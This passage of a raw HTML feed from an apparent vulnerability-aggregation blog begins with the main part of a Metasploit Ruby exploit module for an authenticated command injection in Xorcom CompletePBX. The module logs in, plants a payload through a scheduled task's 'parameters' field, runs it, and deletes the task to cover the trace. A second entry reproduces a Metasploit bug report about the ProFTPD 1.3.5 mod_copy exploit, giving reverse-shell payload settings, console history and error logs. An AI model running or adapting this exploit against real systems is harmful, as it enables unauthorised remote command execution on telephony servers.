class="hljs-string">&#x27;//meta[@name=&quot;application-name&quot;][@content=&quot;Ombutel&quot;]&#x27;</span>)<br><br>      print_good(<span class="hljs-string">&quot;Detected CompletePBX on <span class="hljs-subst">#&#123;peer&#125;</span>&quot;</span>)<br>      <span class="hljs-keyword">return</span> Exploit::CheckCode::Appears<br>    end<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Safe(<span class="hljs-string">&#x27;Target does not appear to be running CompletePBX.&#x27;</span>)<br>  end<br><br>  def login<br>    print_status(<span class="hljs-string">&quot;Attempting authentication with username: <span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;userid&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;userpass&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]<br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target&#x27;</span>)<br>    end<br><br>    <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">200</span><br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&quot;Unexpected HTTP response code: <span class="hljs-subst">#&#123;res.code&#125;</span>&quot;</span>)<br>    end<br><br>    sid_cookie = res.get_cookies.scan(<span class="hljs-regexp">/sid=[a-f0-9]+/</span>).first<br><br>    <span class="hljs-keyword">unless</span> sid_cookie<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Authentication failed: No session ID received&#x27;</span>)<br>    end<br><br>    print_good(<span class="hljs-string">&quot;Authentication successful! Session ID: <span class="hljs-subst">#&#123;sid_cookie&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> sid_cookie<br>  end<br><br>  def get_latest_task_id(sid_cookie, task_desc)<br>    print_status(<span class="hljs-string">&quot;Retrieving latest task ID for description: <span class="hljs-subst">#&#123;task_desc&#125;</span>...&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;tasks&#x27;</span>,<br>        <span class="hljs-string">&#x27;offset&#x27;</span> =&gt; <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;max&#x27;</span> =&gt; <span class="hljs-string">&#x27;20&#x27;</span>,<br>        <span class="hljs-string">&#x27;search&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while fetching tasks&#x27;</span>)<br>    end<br><br>    json_res = res.get_json_document<br>    tasks = json_res[<span class="hljs-string">&#x27;rows&#x27;</span>]<br><br>    <span class="hljs-keyword">unless</span> tasks<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Failed to retrieve task list&#x27;</span>)<br>    end<br><br>    tasks.each <span class="hljs-keyword">do</span> |task|<br>      <span class="hljs-keyword">if</span> task[<span class="hljs-number">2</span>] == task_desc<br>        print_good(<span class="hljs-string">&quot;Found task with ID: <span class="hljs-subst">#&#123;task[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> task[<span class="hljs-number">0</span>]<br>      end<br>    end<br><br>    fail_with(Failure::NotFound, <span class="hljs-string">&quot;Could not find the task with description: <span class="hljs-subst">#&#123;task_desc&#125;</span>&quot;</span>)<br>  end<br><br>  def create_task(sid_cookie)<br>    task_desc = Faker::Lorem.sentence(word_count: <span class="hljs-number">4</span>)<br>    notes = Faker::Lorem.paragraph(sentence_count: <span class="hljs-number">3</span>)<br>    print_status(<span class="hljs-string">&quot;Creating malicious scheduled task with description: <span class="hljs-subst">#&#123;task_desc&#125;</span>&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;script&#x27;</span> =&gt; <span class="hljs-string">&#x27;backup&#x27;</span>,<br>        <span class="hljs-string">&#x27;description&#x27;</span> =&gt; task_desc,<br>        <span class="hljs-string">&#x27;starting&#x27;</span> =&gt; Time.now.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>),<br>        <span class="hljs-string">&#x27;interval&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;interval_unit&#x27;</span> =&gt; <span class="hljs-string">&#x27;month&#x27;</span>,<br>        <span class="hljs-string">&#x27;parameters&#x27;</span> =&gt; <span class="hljs-string">&quot;$(<span class="hljs-subst">#&#123;payload.encoded&#125;</span>)&quot;</span>,<br>        <span class="hljs-string">&#x27;notes&#x27;</span> =&gt; notes,<br>        <span class="hljs-string">&#x27;data&#x27;</span> =&gt; <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;save_task&#x27;</span>,<br>        <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; <span class="hljs-string">&#x27;create&#x27;</span><br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while creating task&#x27;</span>)<br>    end<br><br>    json_res = res.get_json_document<br>    state = json_res[<span class="hljs-string">&#x27;state&#x27;</span>]<br><br>    <span class="hljs-keyword">if</span> state == <span class="hljs-string">&#x27;success&#x27;</span><br>      print_good(<span class="hljs-string">&#x27;Malicious task successfully created.&#x27;</span>)<br>      <span class="hljs-keyword">return</span> task_desc<br>    <span class="hljs-keyword">else</span><br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Failed to create the malicious task&#x27;</span>)<br>    end<br>  end<br><br>  def run_task(sid_cookie, task_id)<br>    print_status(<span class="hljs-string">&quot;Executing malicious task ID <span class="hljs-subst">#&#123;task_id&#125;</span>...&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;run_task&#x27;</span>,<br>        <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; <span class="hljs-string">&#x27;run&#x27;</span>,<br>        <span class="hljs-string">&#x27;data&#x27;</span> =&gt; task_id.to_s<br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while executing task&#x27;</span>)<br>    end<br><br>    print_good(<span class="hljs-string">&#x27;Task executed successfully!&#x27;</span>)<br>  end<br><br>  def delete_task(sid_cookie, task_id)<br>    %w[<span class="hljs-keyword">delete</span> deleteConfirmed].each <span class="hljs-keyword">do</span> |mode|<br>      print_status(<span class="hljs-string">&quot;Sending delete request (mode=<span class="hljs-subst">#&#123;mode&#125;</span>) for task ID <span class="hljs-subst">#&#123;task_id&#125;</span>...&quot;</span>)<br><br>      send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>        <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>          <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;delete_task&#x27;</span>,<br>          <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; mode,<br>          <span class="hljs-string">&#x27;data&#x27;</span> =&gt; task_id.to_s<br>        &#125;<br>      &#125;)<br>    end<br><br>    print_good(<span class="hljs-string">&quot;Task <span class="hljs-subst">#&#123;task_id&#125;</span> deleted successfully!&quot;</span>)<br>  end<br><br>  def exploit<br>    sid_cookie = login<br>    task_desc = create_task(sid_cookie)<br>    task_id = get_latest_task_id(sid_cookie, task_desc)<br>    run_task(sid_cookie, task_id)<br>    delete_task(sid_cookie, task_id)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Xorcom CompletePBX Authenticated Comman</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>ProFTPD 135 mod_copy模块命令执行漏洞</title>
    <link href="http://example.com/2025/06/30/github_2006755968/"/>
    <id>http://example.com/2025/06/30/github_2006755968/</id>
    <published>2025-06-30T15:45:33.330Z</published>
    <updated>2025-06-30T15:45:33.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ProFTPD 1.3.5 mod_copy模块命令执行漏洞</p><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> ProFTPD 1.3.5版本中的mod_copy模块存在命令执行漏洞，攻击者可以利用此漏洞在目标系统上执行任意命令。</p><p><strong>产品厂商：</strong> ProFTPD</p><p><strong>产品名称：</strong> ProFTPD</p><p><strong>影响版本：</strong> 1.3.5</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20274">https://github.com/rapid7/metasploit-framework/issues/20274</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h3><p>How’d you do it?</p><ol><li>get virtualbox ubuntu 24.04</li><li>get meterpreter (i installed as shown on site via shell)</li><li>run unix&#x2F;ftp&#x2F;proftpd_modcopy_exec on appropriate target</li></ol><p>target has Linux, ProFTPD 1.3.5 on port 21, OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) on port 22, Linux telnetd on port 23, Apache httpd 2.4.29 on port 80</p><h3 id="Were-you-following-a-specific-guide-tutorial-or-reading-documentation"><a href="#Were-you-following-a-specific-guide-tutorial-or-reading-documentation" class="headerlink" title="Were you following a specific guide&#x2F;tutorial or reading documentation?"></a>Were you following a specific guide&#x2F;tutorial or reading documentation?</h3><p>documentation based experience</p><h3 id="Expected-behavior"><a href="#Expected-behavior" class="headerlink" title="Expected behavior"></a>Expected behavior</h3><p>upon successful execution, attack should open meterpreter “window” (i’d call it session but it clearly does open session, just doesn’t allow me to type anything in)</p><h3 id="Current-behavior"><a href="#Current-behavior" class="headerlink" title="Current behavior"></a>Current behavior</h3><p>payload successfully executes, i get “meterpreter session opened” and no actual option to use meterpreter</p><p><img src="https://github.com/user-attachments/assets/13ff0f25-7a4f-436f-bbb9-6f3dce6b4b63" alt="Image"></p><p><img src="https://github.com/user-attachments/assets/1aebb4d8-918c-48b2-a251-7970f09b1f36" alt="Image"></p><h4 id="Metasploit-version"><a href="#Metasploit-version" class="headerlink" title="Metasploit version"></a>Metasploit version</h4><p>6.4.55~20250326102656~1rapid7-1</p><h3 id="Module-Datastore"><a href="#Module-Datastore" class="headerlink" title="Module&#x2F;Datastore"></a>Module&#x2F;Datastore</h3><p>The following global&#x2F;module datastore, and database setup was configured before the issue occurred:</p><details><summary>Collapse</summary><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[framework/ui/console]<br><span class="hljs-attribute">ActiveModule</span>=exploit/unix/ftp/proftpd_modcopy_exec<br><br>[unix/ftp/proftpd_modcopy_exec]<br><span class="hljs-attribute">payload</span>=cmd/unix/reverse_perl<br><span class="hljs-attribute">SITEPATH</span>=/var/www/html<br><span class="hljs-attribute">LHOST</span>=10.13.13.13<br><span class="hljs-attribute">LPORT</span>=4445<br><span class="hljs-attribute">RHOSTS</span>=10.13.13.4<br><span class="hljs-attribute">loglevel</span>=3<br>WORKSPACE=<br><span class="hljs-attribute">VERBOSE</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">WfsDelay</span>=2<br><span class="hljs-attribute">EnableContextEncoding</span>=<span class="hljs-literal">false</span><br>ContextInformationFile=<br><span class="hljs-attribute">DisablePayloadHandler</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">RPORT</span>=80<br><span class="hljs-attribute">SSL</span>=<span class="hljs-literal">false</span><br>SSLServerNameIndication=<br><span class="hljs-attribute">SSLVersion</span>=Auto<br><span class="hljs-attribute">SSLVerifyMode</span>=PEER<br>SSLCipher=<br>Proxies=<br>CPORT=<br>CHOST=<br><span class="hljs-attribute">ConnectTimeout</span>=10<br>TCP::<span class="hljs-attribute">max_send_size</span>=0<br>TCP::<span class="hljs-attribute">send_delay</span>=0<br>VHOST=<br><span class="hljs-attribute">UserAgent</span>=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0<br>HttpUsername=<br>HttpPassword=<br>HttpRawHeaders=<br><span class="hljs-attribute">DigestAuthIIS</span>=<span class="hljs-literal">true</span><br><span class="hljs-attribute">FingerprintCheck</span>=<span class="hljs-literal">true</span><br><span class="hljs-attribute">DOMAIN</span>=WORKSTATION<br>HttpClientTimeout=<br><span class="hljs-attribute">HttpTrace</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">HttpTraceHeadersOnly</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">HttpTraceColors</span>=red/blu<br>HTTP::<span class="hljs-attribute">uri_encode_mode</span>=hex-normal<br>HTTP::<span class="hljs-attribute">uri_full_url</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">pad_method_uri_count</span>=1<br>HTTP::<span class="hljs-attribute">pad_uri_version_count</span>=1<br>HTTP::<span class="hljs-attribute">pad_method_uri_type</span>=space<br>HTTP::<span class="hljs-attribute">pad_uri_version_type</span>=space<br>HTTP::<span class="hljs-attribute">method_random_valid</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">method_random_invalid</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">method_random_case</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">version_random_valid</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">version_random_invalid</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">uri_dir_self_reference</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">uri_dir_fake_relative</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">uri_use_backslashes</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">pad_fake_headers</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">pad_fake_headers_count</span>=0<br>HTTP::<span class="hljs-attribute">pad_get_params</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">pad_get_params_count</span>=16<br>HTTP::<span class="hljs-attribute">pad_post_params</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">pad_post_params_count</span>=16<br>HTTP::<span class="hljs-attribute">shuffle_get_params</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">shuffle_post_params</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">uri_fake_end</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">uri_fake_params_start</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">header_folding</span>=<span class="hljs-literal">false</span><br>FileDropperDelay=<br><span class="hljs-attribute">AllowNoCleanup</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">RPORT_FTP</span>=21<br><span class="hljs-attribute">TARGETURI</span>=/<br><span class="hljs-attribute">TMPPATH</span>=/tmp<br>ReverseListenerBindPort=<br><span class="hljs-attribute">ReverseAllowProxy</span>=<span class="hljs-literal">false</span><br>ReverseListenerComm=<br>ReverseListenerBindAddress=<br><span class="hljs-attribute">ReverseListenerThreaded</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">StagerRetryCount</span>=10<br><span class="hljs-attribute">StagerRetryWait</span>=5<br>InitialAutoRunScript=<br>AutoRunScript=<br>CommandShellCleanupCommand=<br><span class="hljs-attribute">AutoVerifySession</span>=<span class="hljs-literal">true</span><br><span class="hljs-attribute">PerlPath</span>=perl<br></code></pre></td></tr></table></figure></details><h3 id="Database-Configuration"><a href="#Database-Configuration" class="headerlink" title="Database Configuration"></a>Database Configuration</h3><p>The database contains the following information:</p><details><summary>Collapse</summary><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Session</span> <span class="hljs-keyword">Type</span>: Connected <span class="hljs-keyword">to</span> msf. <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">type</span>: postgresql.<br></code></pre></td></tr></table></figure><table><thead><tr><th align="right">ID</th><th align="right">Hosts</th><th align="right">Vulnerabilities</th><th align="right">Notes</th><th align="right">Services</th></tr></thead><tbody><tr><td align="right">1 <strong>(Current)</strong></td><td align="right">1</td><td align="right">1</td><td align="right">0</td><td align="right">0</td></tr><tr><td align="right"><strong>Total (1)</strong></td><td align="right"><strong>1</strong></td><td align="right"><strong>1</strong></td><td align="right"><strong>0</strong></td><td align="right"><strong>0</strong></td></tr></tbody></table></details><h3 id="Framework-Configuration"><a href="#Framework-Configuration" class="headerlink" title="Framework Configuration"></a>Framework Configuration</h3><p>The features are configured as follows:</p><details><summary>Collapse</summary><table><thead><tr><th align="right">name</th><th align="right">enabled</th></tr></thead><tbody><tr><td align="right">wrapped_tables</td><td align="right">true</td></tr><tr><td align="right">fully_interactive_shells</td><td align="right">false</td></tr><tr><td align="right">manager_commands</td><td align="right">false</td></tr><tr><td align="right">metasploit_payload_warnings</td><td align="right">true</td></tr><tr><td align="right">defer_module_loads</td><td align="right">false</td></tr><tr><td align="right">smb_session_type</td><td align="right">true</td></tr><tr><td align="right">postgresql_session_type</td><td align="right">true</td></tr><tr><td align="right">mysql_session_type</td><td align="right">true</td></tr><tr><td align="right">mssql_session_type</td><td align="right">true</td></tr><tr><td align="right">ldap_session_type</td><td align="right">true</td></tr><tr><td align="right">show_successful_logins</td><td align="right">false</td></tr><tr><td align="right">dns</td><td align="right">true</td></tr><tr><td align="right">hierarchical_search_table</td><td align="right">true</td></tr><tr><td align="right">display_module_action</td><td align="right">true</td></tr></tbody></table></details><h3 id="History"><a href="#History" class="headerlink" title="History"></a>History</h3><p>The following commands were ran during the session and before this issue occurred:</p><details><summary>Collapse</summary><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">23 </span>    search Pro FTPD<br><span class="hljs-symbol">24 </span>    search Pro FTPD <span class="hljs-number">1.3</span>.<span class="hljs-number">5</span><br><span class="hljs-symbol">25 </span>    use <span class="hljs-number">0</span><br><span class="hljs-symbol">26 </span>    show payloads<br><span class="hljs-symbol">27 </span>    use <span class="hljs-number">10</span><br><span class="hljs-symbol">28 </span>    set payload <span class="hljs-number">10</span><br><span class="hljs-symbol">29 </span>    show options<br><span class="hljs-symbol">30 </span>    set SITEPATH /var/www<br><span class="hljs-symbol">31 </span>    set SITEPATH /var/www/html<br><span class="hljs-symbol">32 </span>    set LHOST <span class="hljs-number">10.13</span>.<span class="hljs-number">13.13</span><br><span class="hljs-symbol">33 </span>    set LPORT <span class="hljs-number">4445</span><br><span class="hljs-symbol">34 </span>    <span class="hljs-keyword">run</span><br><span class="hljs-symbol">35 </span>    set RHOSTS <span class="hljs-number">10.13</span>.<span class="hljs-number">13.4</span><br><span class="hljs-symbol">36 </span>    <span class="hljs-keyword">run</span><br><span class="hljs-symbol">37 </span>    msfupdate<br><span class="hljs-symbol">38 </span>    show options<br><span class="hljs-symbol">39 </span>    set loglevel <span class="hljs-number">3</span><br><span class="hljs-symbol">40 </span>    <span class="hljs-keyword">run</span><br><span class="hljs-symbol">41 </span>    debug<br></code></pre></td></tr></table></figure></details><h3 id="Framework-Errors"><a href="#Framework-Errors" class="headerlink" title="Framework Errors"></a>Framework Errors</h3><p>The following framework errors occurred before the issue occurred:</p><details><summary>Collapse</summary><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix">[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">54</span>:<span class="hljs-number">29</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Dependency for windows<span class="hljs-symbol">/encrypted_reverse_tcp</span> is not supported<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">55</span>:<span class="hljs-number">27</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> rhosts walker invalid <span class="hljs-operator">-</span> NoMethodError undefined method `scan&#x27; for nil:NilClass<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">55</span>:<span class="hljs-number">44</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Exploit failed (unix<span class="hljs-operator">/</span>ftp<span class="hljs-operator">/</span>proftpd_modcopy_exec): Rex::BindFailed The address is already <span class="hljs-keyword">in</span> use <span class="hljs-keyword">or</span> <span class="hljs-params">unavailable:</span> (<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4445</span>). <span class="hljs-operator">-</span> Rex::BindFailed The address is already <span class="hljs-keyword">in</span> use <span class="hljs-keyword">or</span> <span class="hljs-params">unavailable:</span> (<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4445</span>).<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">06</span>:<span class="hljs-number">38</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Exploit failed (unix<span class="hljs-operator">/</span>ftp<span class="hljs-operator">/</span>proftpd_modcopy_exec): Rex::BindFailed The address is already <span class="hljs-keyword">in</span> use <span class="hljs-keyword">or</span> <span class="hljs-params">unavailable:</span> (<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4445</span>). <span class="hljs-operator">-</span> Rex::BindFailed The address is already <span class="hljs-keyword">in</span> use <span class="hljs-keyword">or</span> <span class="hljs-params">unavailable:</span> (<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4445</span>).<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">17</span>:<span class="hljs-number">56</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Dependency for windows<span class="hljs-symbol">/x64/encrypted_shell_reverse_tcp</span> is not supported<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">17</span>:<span class="hljs-number">57</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Dependency for windows<span class="hljs-symbol">/encrypted_shell_reverse_tcp</span> is not supported<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">18</span>:<span class="hljs-number">07</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Dependency for windows<span class="hljs-symbol">/x64/encrypted_reverse_tcp</span> is not supported<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">18</span>:<span class="hljs-number">09</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Dependency for windows<span class="hljs-symbol">/encrypted_reverse_tcp</span> is not supported<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">21</span>:<span class="hljs-number">52</span>] [e(<span class="hljs-number">0</span>)] <span 